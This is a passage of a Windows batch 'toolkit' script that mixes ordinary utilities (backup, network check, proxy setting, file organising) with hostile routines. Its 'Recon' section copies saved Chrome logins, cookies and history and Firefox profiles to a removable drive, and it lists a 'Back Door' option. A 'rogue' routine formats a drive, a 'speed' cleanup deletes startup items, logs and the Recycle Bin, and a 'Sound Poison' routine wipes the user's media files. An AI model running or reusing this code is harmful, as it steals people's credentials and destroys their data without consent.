xcopy /S /C /V /I /L /Q /H %LOCK%\*.* "%USB%\Backup"
goto start
:backdrive
xcopy /S /C /V /I /L /Q /H %USB%\*.* "%LOCK%\Backup"
goto start

:Internet
Echo checking connection to google, please wait.....
ping -n 1 www.google.com | find "reply from " > NUL
echo.
if not ERRORLEVEL 1 GOTO SUCCESS
IF ERRORLEVEL 1 GOTO TryAgain
:TryAgain
echo Failure!!
echo let me try abit more, wait
ping -n 3 www.google.com | find "reply from " >NUL
echo.
if not ERRORLEVEL 1 GOTO SUCCESS 2
IF ERRORLEVEL 1 GOTO TryIP
:TryIP
echo Failure !!
echo lets try by IP address
ping -n 1 31.13.90.66  | find "reply from " >NUL
echo.
if not ERRORLEVEL 1 GOTO SUCCESSDns
IF ERRORLEVEL 1 GOTO TestInternet
:TestInternet
echo Failure !!
echo lets test Internet Connection
ping -n 1 www.google.com  | find "reply from " >NUL
echo.
if not ERRORLEVEL 1 GOTO SUCCESS 3
IF ERRORLEVEL 1 GOTO Netdown
:SUCCESS
echo  Your Computer (%Computer name%) is connected to the Network!!
goto End
:SUCCESS 2
echo  Your Computer (%Computername%) is connected to the Network but packet loss was detected!!
goto End
:SUCCESS 3
echo  Your Computer (%Computername%) does have an active Internet connection but your computer is connecting to the internet network.
goto End
:SUCCESSDns
echo  Your Computer (%Computername%)is connected to the internal network but you have DNS issues.
goto End
:Netdown
echo  Your Computer (%Computername%) does not have an active internet connection.
goto End

:End
goto start

:Recon
echo 1)Reconn PC
echo 2)Back Door
echo.
echo.
set/p "recon=>"
if %recon%==1 goto scan
if %recon%==2 goto backdoors
:scan
echo.
set /P Recosb="Enter drive letter to view results: "
set Recosb=%Recosb%:
echo please wait
mkdir "%Recosb%\Recon\"
mkdir "%Recosb%\Recon\Browser_Files\"
systeminfo >> "%Recosb%\Recon\%USERDOMAIN%\_Systeminfo.txt"
ipconfig /all >> "%Recosb%\Recon\Ipconfig.txt"
TASKLIST >> "%Recosb%\Recon\Tasklist.txt"
WMIC DISKDRIVE >> "%Recosb%\Recon\Disk.Drivers.txt"
WMIC VOLUME >> "%Recosb%\Recon\Disk.Volume.txt"
WMIC LOGICALDISK LIST >>"%Recosb%\Recon\Logical.Disk.txt"
WMIC CPU LIST >> "%Recosb%\Recon\Cpu.txt"
WMIC NETPROTOCOL >>"%Recosb%\Recon\Net.Protocol.txt"
WMIC SHARE LIST >> "%Recosb%\Recon\Share.txt"
WMIC SYSDRIVER >> "%Recosb%\Recon\SYS.Drivers.txt"
WMIC GROUP LIST >> "%Recosb%\Recon\Group.List.txt"
WMIC SOUNDDEV >> "%Recosb%\Recon\Sound.Device.txt"
WMIC SYSTEMSLOT >> "%Recosb%\Recon\System.Slots.txt"
WMIC USERACCOUNT LIST >> "%Recosb%\Recon\Accounts.txt"
WMIC STARTUP >> "%Recosb%\StartUp.txt"
DIR /Q %HOMEDRIVE%\%HOMEPATH%\Desktop >> "%Recosb%\Recon\Dir_Desktop.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Desktop /A >> "%Recosb%\Recon\Dir_Desktop2.txt"
DIR /Q %HOMEDRIVE%\%HOMEPATH%\Documents >> "%Recosb%\Recon\Dir_Documents.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Documents /A >> "%Recosb%\Recon\Dir_Documents2.txt"
DIR /Q %HOMEDRIVE%\%HOMEPATH%\Pictures >> "%Recosb%\Recon\Dir_Pictures.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Pictures /A >> "%Recosb%\Recon\Dir_Pictures2.txt"
DIR /Q %HOMEDRIVE%\%HOMEPATH%\Downloads >> "%Recosb%\Recon\Dir_Downloads.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Downloads /A >> "%Recosb%\Recon\Dir_Downloads2.txt"
DIR /Q %HOMEDRIVE%\%HOMEPATH%\Favorites >> "%Recosb%\Recon\Dir_Favorites.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Favorites /A >> "%Recosb%\Recon\Dir_Favorites2.txt"
DIR /Q %HOMEDRIVE%\%HOMEPATH%\Videos >> "%Recosb%\Recon\Dir_Videos.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Videos /A >> "%Recosb%\Recon\Dir_Videos2.txt"
DIR /Q %HOMEDRIVE%\%HOMEPATH%\Music >> "%Recosb%\Recon\Dir_Music.txt"
DIR /Q %HOMEDRIVE%\%HOMEPATH%\Contacts >> "%Recosb%\Recon\Dir_Contacts.txt"
TREE %HOMEDRIVE%\%HOMEPATH%\Contacts /A >> "%Recosb%\Recon\Dir_Contacts2.txt"
DIR /Q %HOMEPATH% >> "%Recosb%\Recon\Dir_Homepath.txt"
TREE %HOMEPATH% /F >> "%Recosb%\Recon\Dir_Homepath2.txt"
TREE %HOMEPATH% /A >> "%Recosb%\Recon\Dir_Homepath3.txt"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Roaming\Mozilla\Firefox\Profiles" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Login Data-journal" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Cookies" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Cookies-journal" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\History" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Archived History" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Archived History-journal" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\History Provider Cache" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\History-journal" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Last Session" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Last Tabs" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Top Sites" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Top Sites-journal" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\TransportSecurity" "%Recosb%\Recon\Browser_Files\"
XCOPY /S /I /Q "%HOMEDRIVE%\%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Visited Links" "%Recosb%\Recon\Browser_Files\"
::copy all files to removable drive
::uncomment below when ready
::for  %%F in (%0) do (
::    echo Current drive is %%~dF
::    xcopy %%~dF\batchfiles\* G:\batchfiles\* /d /v /-y
::    xcopy G:\batchfiles\* %%~dF\batchfiles\* /d /v /-y
::                               )
::echo.
::echo Copies complete %date% %time%
::echo.
echo Running bonuses
dir /q /s C:\Users >>%Recosb%\Bonus.txt
echo Please wait
echo Thank you for your patience
pause
cls
goto start
:Virus
@echo off
echo  Removing Shortcuts and suspicous files
ECHO SET DRIVE LETTER
:setdrisc
set /P CHISB="Drive to Scan:"
set CHISB=%CHISB%:
cd %CHISB%
xcopy /q /s /c /i /y "�\*.*" "%CHISB%\Music"
del /s /q "%CHISB%\Skypee"
del /q "%CHISB%\Skypee"
del /s /q "%CHISB%\z"
del /s /q "%CHISB%\Google"
del "%CHISB%\autorun.inf"
del "%CHISB%\*.vbe"
del "%CHISB%\*.lnk"
del "%CHISB%\*.tmp"
del "%CHISB%\*.vbs"
del "%CHISB%\*.tmp"
del "%CHISB%\*.*.exe"
del "%CHISB%\fypuas.exe"
del "%CHISB%\fypuasx.exe"
del "%CHISB%\Microsoft.exe"
del /s /q "%CHISB%\mojih"
cls
echo Removed Shortcuts
echo.
echo  Making your folders visible
echo  This may take few minutes..........
echo  Please wait..........
echo.
echo.
attrib /s /d -s -h -r "%CHISB%\*.*"
echo  Now the folders are visible
goto start
:flash
echo wair a bit
:proxy
echo 1)Set Proxy
echo 2)Reset Proxy
echo.
echo.
set/p "pro=>"
if %pro%==1 goto setpro
if %pro%==2 goto reset
:setpro
set /P PRON="Proxy name "
set PRON=%PRON%
set /P PROP="Proxy port "
set PROP=%PROP%
echo.
echo.
netsh winhttp set proxy %PRON%:%PROP%
Echo Done
goto start
:reset
netsh winhttp reset proxy
echo Done
goto start
:organiser
@echo off

xcopy /q /s /c /i /y /l "C:\users\%username%\Desktop\*.3gp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.3gpp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.dat" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.ogg" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.flv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.mp3" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.mpg" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.mpeg1" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.webm" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.wma" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.wmv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.vob" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.3gp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.3gpp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.ogg" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.dat" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.avi" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.flv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.mp4" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.mp3" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.mpg" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.mpeg1" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.webm" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.wma" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.wmv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Documents\*.vob" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.3gp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.3gpp" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.ogg" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.dat" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.avi" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.flv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.mp4" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.mp3" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.mpeg1" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.webm" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.wma" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.wmv" "C:\users\%username%\Music"
xcopy /q /s /c /i /y "C:\users\%username%\Pictures\*.vob" "C:\users\%username%\Music"
goto start

:rogue
echo You are a bad person
echo Is someone after you or you are after someone
echo You may choice to format or just deny access to the Computer
echo We will go rouge in 5 seconds
timeout 5
set /P FDRIV="Set Drive to Format:"
set FDRIV=%FDRIV%:
format "%FDRIV%" /q /x /FS:NTFS /V:STEITH 
goto start

:speed
@echo off
del /s /f /q "C:\Users\%username%\Links\*.*"
del /s /f /q c:\windows\temp\*.*
rmdir /s /q c:\windows\temp
md c:\windows\temp
rmdir /s /q C:\WINDOWS\Prefetch
del /s /f /q %temp%\*.*
rd /s /q %temp%
del C:\WINDOWS\Temp\*.*
del C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\*.tmp
del C:\WINDOWS\Prefetch\*.pf
del C:\Documents and Settings\Administrator\Recent\*.*
del C:\Documents and Settings\Administrator\Cookies\*.*
del /s /q /f "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.*"
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*
del /s /q C:\users\%username%\AppData\Local\Temp\*.*
del /s /q C:\users\%username%\AppData\Roaming\Microsoft\Office\Recent\*.*
del /s /q C:\users\%username%\AppData\Roaming\Microsoft\Windows\Recent\*.*
del /s /q /f "C:\Windows\PFRO.log"
del /s /q /f "C:\Windows\setupact.log"
del /s /q /f "C:\Windows\setuperr.log"
del /s /q /f "C:\Windows\WindowsUpdate.log"
del /s /q /f "C:\Windows\SoftwareDistribution\ReportingEvents.log"
del /s /q /f "C:\Windows\Logs\CBS\CBS.log"
del /s /q /f "C:\Windows\Logs\DISM\dism.log"
del /s /q /f "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\MpCmdRun.log"
del /s /q /f "C:\users\%username%\AppData\Local\Microsoft\Windows\WindowsUpdate.log"
del /s /q /f "C:\users\%username%\AppData\Local\Microsoft\Windows\WebCache\V0100019.log"
del /s /q /f C:\users\%username%\AppData\Local\Microsoft\Windows\WebCache\*.*
del /s /q /f C:\users\%username%\AppData\Local\Microsoft\Windows\INetCache\*.*
del /s /q /f "C:\Windows\inf\setupapi.dev.log"
del /s /q /f "C:\Windows\Performance\WinSAT\winsat.log"
del /s /q /f "C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\NGenTask.exe.log"
del /s /q /f "C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\taskhost.exe.log"
del /s /q /f "C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\taskhostex.exe.log"
del /s /q /f "C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\tzsync.exe.log"
del /s /q /f "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs\NGenTask.exe.log"	
del /s /q C:\users\%username%\AppData\Roaming\vlc\art\*.*
del /s /q C:\users\%username%\Desktop\~$*.*
del /s /q C:\users\%username%\Documents\~*.*
del /s /q C:\users\%username%\Pictures\~$*.*
del /s /q C:\users\%username%\Music\~$*.*
del /s /q C:\users\%username%\AppData\Local\Microsoft\OIS\*.*
del /s /q C:\users\%username%\AppData\Roaming\Microsoft\Office\*.*
del /s /q C:\users\%username%\AppData\Local\Microsoft\Media Player\Art Cache\*.*
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_1024.db
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_1600.db
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_exif.db
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_sr.db
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_wide.db
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_wide_alternate.db
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_16.db
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_32.db
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_96.db
del /s /q C:\users\%username%\AppData\Local\Microsoft\Windows\WER\ReportQueue\*.*
del /s /q C:\ProgramData\Microsoft\Windows\WER\ReportQueue\*.*
del /s /q C:\users\%username%\AppData\Local\Microsoft\Media Player\Art Cache\LocalMLS\*.*
del /s /q C:\Windows\MiniDump\*.dmp
del /s /q C:\Windows\System32\FNTCACHE.DAT
del /s /q C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.log
del /s /q C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.log
del /s /q C:\Windows\inf\setupapi.app.log
del /s /q C:\Users\%username%\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\NGenTask.exe.log
del /s /q C:\Users\%username%\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\sdiagnhost.exe.log
del /s /q C:\Users\%username%\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs\NGenTask.exe.log
del /s /q %systemdrive%\$Recycle.bin
rmdir /s %systemdrive%\$Recycle.bin
::rmdir /s /q c:\windows\temp
::C:\Users\%username%\AppData\Local\Mozilla\Firefox\Profiles\02utlyq2.default\cache2
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cache\data_0"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cache\data_1"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cache\data_2"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cache\data_3"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cache\f_000001"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cache\f_000002"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cache\f_000003"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cache\f_000004"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cache\index"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\GPUCache\data_0"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\GPUCache\data_1"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\GPUCache\data_2"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\GPUCache\data_3"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\GPUCache\index"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\ShaderCache\GPUCache\data_0"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\ShaderCache\GPUCache\data_1"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\ShaderCache\GPUCache\data_2"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\ShaderCache\GPUCache\data_3"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\ShaderCache\GPUCache\f_000001"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\ShaderCache\GPUCache\f_000002"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\ShaderCache\GPUCache\f_000003"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\ShaderCache\GPUCache\f_000004"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\ShaderCache\GPUCache\index"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Safe Browsing Cookies-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Cookies-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Favicons-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\heavy_ad_intervention_opt_out.db-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\History-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Login Data-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Media History-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Network Action Predictor-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\QuotaManager-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Reporting and NEL-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Shortcuts-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Top Sites-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Web Data-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Application Cache\Index-journal"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\Windows\WER\ReportArchive\AppCrash_WINWORD.EXE_aef4acc9b23a5db4d7b4f1473e97cd395c4e6fbc_00000000_16e55285\Report.wer"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\Windows\WER\ReportArchive\AppHang_es2launcher.exe_db73245b6d02c2a937ae08e1c8e83d0c1c41439_1c040d0d_04acec29\Report.wer"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\Windows\WER\ReportArchive\AppHang_ytd.exe_8e3fd73f9bd45b373227811783dca6b386ebcd3_21d16a78_154e4007\Report.wer"
del /s /q /f "C:\Users\%username%\AppData\Local\ElevatedDiagnostics\3493975886\2020072506.000\DeviceCenterDiagnostic.debugreport.xml"
del /s /q /f "C:\Users\%username%\AppData\Local\ElevatedDiagnostics\3493975886\2020072506.000\DeviceDiagnostic.debugreport.xml"
del /s /q /f "C:\Users\%username%\AppData\Local\ElevatedDiagnostics\3493975886\2020072506.000\NetworkDiagnostics.debugreport.xml"
del /s /q /f "C:\Users\%username%\AppData\Local\ElevatedDiagnostics\3493975886\2020072506.000\PrinterDiagnostic.debugreport.xml"
del /s /q /f "C:\Users\%username%\AppData\Local\ElevatedDiagnostics\3493975886\2020072506.000\ResultReport.xml"
del /s /q /f "C:\Users\%username%\AppData\Local\ElevatedDiagnostics\3493975886\2020072506.000\results.xml"
del /s /q /f "C:\Users\%username%\AppData\Local\ElevatedDiagnostics\3493975886\2020072506.000\results.xsl"
del /s /q /f "C:\Users\%username%\AppData\Local\ElevatedDiagnostics\3493975886\2020072506.000\UsbCoreDiagnostic.debugreport.xml"
del /s /q /f "C:\Users\%username%\AppData\Local\ElevatedDiagnostics\3493975886\2020072506.000\UsbTs.etl"
del /s /q /f "C:\Users\%username%\AppData\Local\ElevatedDiagnostics\3493975886\latest.cab"
del /s /q /f "C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.old.log"
del /s /q /f "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.old.log"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\helppane.exe.log"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\mmc.exe.log"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs\HPScan.exe.log"
del /s /q /f "C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\AutoPico.exe.log"
del /s /q /f "C:\Users\%username%\AppData\Roaming\Microsoft\Office\Recent\index.dat"
del /s /q /f "C:\Users\%username%\AppData\Roaming\Microsoft\Office\Recent\Steith Monthly Planner.LNK"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\FSD-CNRY.FSD"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\FSD-{DE7ED190-AF91-41E5-816F-12D8F451F8BF}.FSD"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\FSF-CTBL.FSF"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\LocalCacheFileEditManager\FSD-CNRY.FSD"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\LocalCacheFileEditManager\FSD-{A175D2BF-B2A2-4799-80F0-B9653E74CEEA}.FSD"
del /s /q /f "C:\Users\%username%\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\LocalCacheFileEditManager\FSF-{0E1EEE64-E8C6-4E2A-9759-63CF07FD8988}.FSF"
del /s /q /f "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\edb0051E.log"
del /s /q /f "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\edbtmp.log"

::Activate under specific conditions
::REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
::REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
::REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices"
::REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
::REG DELETE "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
::REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
::REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
::REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices"
::REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
::REG DELETE "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows"

::ROBOCOPY %userprofile%\Desktop "H:\dddd\NNNew folder" /move /minage:7
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.doc" "C:\Users\%username%\Documents\"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.docx" "C:\Users\%username%\Documents\"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.xls" "C:\Users\%username%\Documents\"
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.xlsx" "C:\Users\%username%\Documents\" 
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.pdf" "C:\Users\%username%\Documents\" 
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.jpg" "C:\Users\%username%\Pictures\" 
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.jpeg" "C:\Users\%username%\Pictures\" 
xcopy /q /s /c /i /y "C:\users\%username%\Desktop\*.png" "C:\Users\%username%\Pictures\" 







echo Your Computer is Clean and Faster
echo h
pause
cls
goto start 
:firesk
start firefox.exe
goto start
:safefail
echo edit this part to fix chinese laptops
echo download the apporiate language-locale for your device
echo set the download path
echo wait
DISM /Online /Add-Package /PackagePath:C:\lp\lp.cab
bcdedit /set {current} locale en-US
bcdboot %WinDir% /l en-US
DISM /Online /Get-Packages > C:\pack.txt
DISM /Online /Remove-Package /PackageName:Microsoft-Windows-Client-LanguagePack-Package~31bf3856ad364e35~amd64~zh-CN~6.1.7601.17514
REG ADD REM HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MUI\UILanguages \t
ECHO delete the folders that have language-locale codes different from the ones you need. 
ECHO For example ru-RU or es-ES.
pause
goto start
@echo off
Title Computer Sound Poison
color 0C
echo you are about to loss all your music and vidoes
pause
:sopelete
del /s /q "C:\users\%username%\Desktop\*.3gp"
del /s /q "C:\users\%username%\Desktop\*.3gpp"
del /s /q "C:\users\%username%\Desktop\*.dat"
del /s /q "C:\users\%username%\Desktop\*.ogg"
del /s /q "C:\users\%username%\Desktop\*.flv"
del /s /q "C:\users\%username%\Desktop\*.jpeg"
del /s /q "C:\users\%username%\Desktop\*.jpg"
del /s /q "C:\users\%username%\Desktop\*.mp3"
del /s /q "C:\users\%username%\Desktop\*.mpg"
del /s /q "C:\users\%username%\Desktop\*.mpeg1"
del /s /q "C:\users\%username%\Desktop\*.webm"
del /s /q "C:\users\%username%\Desktop\*.wma"
del /s /q "C:\users\%username%\Desktop\*.wmv"
del /s /q "C:\users\%username%\Desktop\*.vob"
del /q /A:H "C:\users\%username%\Documents"
del /s /q "C:\users\%username%\Documents\*.3gp"
del /s /q "C:\users\%username%\Documents\*.3gpp"
del /s /q "C:\users\%username%\Documents\*.ogg"
del /s /q "C:\users\%username%\Documents\*.dat"
del /s /q "C:\users\%username%\Documents\*.avi"
del /s /q "C:\users\%username%\Documents\*.flv"
